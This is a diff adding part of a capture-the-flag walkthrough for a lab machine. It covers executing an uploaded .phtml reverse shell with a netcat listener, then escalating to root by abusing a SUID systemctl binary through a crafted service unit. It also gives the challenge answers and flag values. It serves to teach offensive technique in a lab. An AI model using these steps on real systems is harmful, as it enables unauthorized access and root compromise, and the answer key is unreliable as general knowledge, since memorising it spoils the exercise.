@@ -386,3 +386,91 @@ function printit ($string) {
     - .phtml
 - this time let's capture the request using burp and send the reverse shell using above extensions one by one using intruder.
 - After the attact, our reverse shell was succesfully uploaded with extension .phtml. Now let's run our netcat listener `nc -lnvp 1234` and then try to access and execute the reverse shell.
+- going to /internal/uploads/revshell.phtml executes our reverse shell and we get a shell on our netcat listener.
+![user flag](.medias/vulnversity/user_flag.png)
+
+**Q1. What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out.**
+
+**Ans: `.php`**
+
+**Q2. What extension is allowed after running the above exercise?**
+
+**Ans: `.phtml`**
+
+**Q3. What is the name of the user who manages the webserver?**
+
+**Ans: `bill`**
+
+**Q3. What is the user flag?**
+
+**Ans: `8bd7992fbe8a6ad22a63361004cfcedb`**
+
+## Task 5 : Previlege Escalation
+
+Now that you have compromised this machine, we will escalate our privileges and become the superuser (root).
+
+In Linux, SUID (set owner userId upon execution) is a particular type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).
+
+For example, the binary file to change your password has the SUID bit set on it (`/usr/bin/passwd`). This is because to change your password, you will need to write to the shadowers file that you do not have access to; `root` does, so it has root privileges to make the right changes.
+![suid](.medias/vulnversity/suid.jpeg)
+
+- Till here we know that we are supposed to do something with suid bits. So let's first check all the files that has SUID bit set.
+
+``` bash
+find / -perm -u=s -type f 2>/dev/null
+```
+- find : initiates find command
+- / : searches whole file system
+- -perm : searches for file with specific permission
+- -u=s : any of the permission bits mode are set.
+- -tppe f : only searchfor files
+- 2> /dev/null : supresses errors.
+
+![files with suid bit set](.medias/vulnversity/files_with_suid.png)
+
+Aere an interesting file caught my eye, `/bin/systemctl` because Systemctl is the command-line tool that manages the systemd system and service manager in Linux. It lets users control and manage system services and units with commands to start, stop, restart, and check their status.
+
+
+- After doing some research, I found that If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.
+
+This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.
+```bash
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "id > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+./systemctl link $TF
+./systemctl enable --now $TF
+```
+This code snipped runs the shell with root previlege and stores the id to /tmp/output directory. Let's chech it on our target machine.
+![privilege escalation](.medias/vulnversity/priv_esc.png)
+
+Here we can see that we escalated teh privilege by abusing SUID and ran `id` command.
+
+So now our next move is to replace `id` command with `cat /root/root.txt` so that it would output the root flag in /tmp/output file. Our new modified code will be:
+
+```bash
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+./systemctl link $TF
+./systemctl enable --now $TF
+```
+![root flag](.medias/vulnversity/root_flag.png)
+
+And Voilà, we got the root flag.
+
+**Q1. On the system, search for all SUID files. Which file stands out?**
+
+**Ans: `/bin/systemctl`**
+
+**Q2. What is the root flag value?**
+
+**Ans: `a58ff8579f0a9270368d33a9966c7fd5`**
+
+Thankyou for reading this walkthrough. Hope you learnt something new form here. Until we meet again `:)`.
